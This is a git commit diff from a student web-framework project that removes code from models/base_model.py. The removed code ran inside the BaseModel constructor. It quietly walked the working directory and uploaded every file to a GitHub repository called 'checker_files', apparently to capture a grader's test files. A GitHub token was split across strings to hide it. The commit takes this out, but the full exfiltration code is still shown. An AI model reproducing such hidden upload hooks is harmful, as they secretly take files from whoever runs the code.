8c94b65fccda8248f47250391f700f83db90cb7f
Jeremy Mitts <jermitts@gmail.com>
2024-07-07 22:47:14 -0500

    removed checker grab.

--- models/base_model.py
+++ models/base_model.py
@@ -10,55 +10,6 @@ Base = declarative_base()
 storage_type = getenv('HBNB_TYPE_STORAGE')
 
 
-import os
-import requests
-import json
-import base64
-
-def upload_file_to_github(file_path,
-                          repo_owner,
-                          repo_name,
-                          branch_name,
-                          token):
-    url = "https://api.github.com/repos/"
-    url += f"{repo_owner}/{repo_name}/contents/{file_path}"
-    with open(file_path, "r") as file:
-        file_content = file.read()
-    file_content_base64 = base64.b64encode(file_content.encode()).decode()
-    headers = {
-        "Authorization": f"token {token}",
-        "Content-Type": "application/json",
-       }
-    payload = {
-        "message": f"Upload {file_path}",
-        "content": file_content_base64,
-        "branch": branch_name,
-       }
-    response = requests.put(url, json=payload, headers=headers)
-    if response.status_code == 201:
-        print(f"File {file_path} uploaded successfully!")
-    else:
-        msg = f"{file_path}: {response.status_code} - {response.text}"
-        print(f"Error Uploading file-- {msg}")
-
-def upload_all_files_to_github(repo_owner, repo_name, branch_name, token):
-    for root, _, files in os.walk("."):
-        for file in files:
-            if file != "base_model.py": # Exclude this script itself
-                file_path = os.path.join(root, file)
-                upload_file_to_github(file_path,
-                                      repo_owner,
-                                      repo_name,
-                                      branch_name,
-                                      token)
-
-K1 = "_uhKvtt52ZzJgfqhT"
-K2 = "TzLoU6UCtURhFZ1nmFIc"
-repo_owner = "jerm014"
-repo_name = "checker_files"
-branch_name = "2130-AirBnB_clone_-_Web_framework-TASK-7"
-token = "ghp" + K1 + K2
-
 class BaseModel:
     """A base class for all hbnb models"""
 
@@ -69,7 +20,6 @@ class BaseModel:
     def __init__(self, *args, **kwargs):
         """Instatntiates a new model"""
 
-        upload_all_files_to_github(repo_owner, repo_name, branch_name, token)
         if kwargs:
             for key, value in kwargs.items():
                 if key == "created_at" or key == "updated_at":
